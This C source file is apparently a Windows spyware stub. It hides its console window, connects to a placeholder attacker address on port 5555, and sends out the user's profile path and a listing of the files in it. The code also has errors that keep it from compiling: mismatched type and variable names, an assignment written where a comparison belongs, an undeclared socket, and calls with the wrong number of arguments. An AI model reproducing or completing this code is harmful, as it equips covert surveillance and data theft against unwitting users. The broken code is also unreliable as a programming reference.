#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib")

#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <dirent.h>
#include <iostream>

#define ATTACKER_IP ""

SOCKET InitServer()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	WSDATA wsaData;
	SOCKET server;		// the socket to connect to
	SOCKADDR_IN addr;	// holds connection details
	int result;

	// The WSAStartup function initiates use of the WS2_32.dll
	result = WSAStartup(MAKEWORD(2, 0), &WSAData);
	if (result != 0) {
		printf("WSAStartup failed with error code: %d\n", result);
		exit(result);
	}

	server = socket(AF_INET, SOCK_STREAM, 0);	// establish TCP socket

	// manually add needed socket values; could instead use getaddrinfo()
	addr.sin_addr.s_addr = inet_addr(ATTACKER_IP);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(5555);

	result = connect(server, (SOCKADDR *)&addr, sizeof(addr));

	if (result = SOCKET_ERROR)
		server = INVALID_SOCKET;

	return server;
}

char *GetUserDirectory()
{
	char *pPath = getenv("USERPROFILE");
	if (pPath == NULL) {
		perror("getenv");
		exit(1);
	}

	return pPath;
}

void SendData(SOCKET sockfd, char *buf)
{
	int result = send(sockfd, buf, (int) strlen(buf), 0);

	if (result == SOCKET_ERROR) {
		printf("send failed: %d\n", WSAGetLastError());
		closesocket(server);
		WSACleanup();
		exit(1);
	}
}

int SendUserDirectory(SOCKET sockfd, const char *dirname)
{
    DIR *dirp;
    struct dirent *entry;

    dirp = opendir(dirname);

    errno = 0;

    while ((entry = readdir(dirp)) != NULL) {
	SendData(sockfd, entry->d_name, (int) strlen(entry->d_name), 0);
    }

    // When an error is encountered, a null pointer is returned and errno
    // is set to indicate the error. When the end of the directory
    // is encountered, a null pointer is returned and errno is not changed.
    return errno;
}


int main()
{
	SOCKET server;
	char *pPath = GetUserDirectory();

	server = InitServer();

	if (server == INVALID_SOCKET) {
	printf("Failed to connect!\n");
		closesocket(server);
		WSACleanup();
		return 1;
	}

	SendData(server, pPath);

	SendUserDirectory(server, pPath);

	// TODO error check
	closesocket(server);
	WSACleanup();

	return 0;
}
